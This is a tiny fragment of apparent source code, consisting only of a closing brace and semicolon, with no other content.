 };
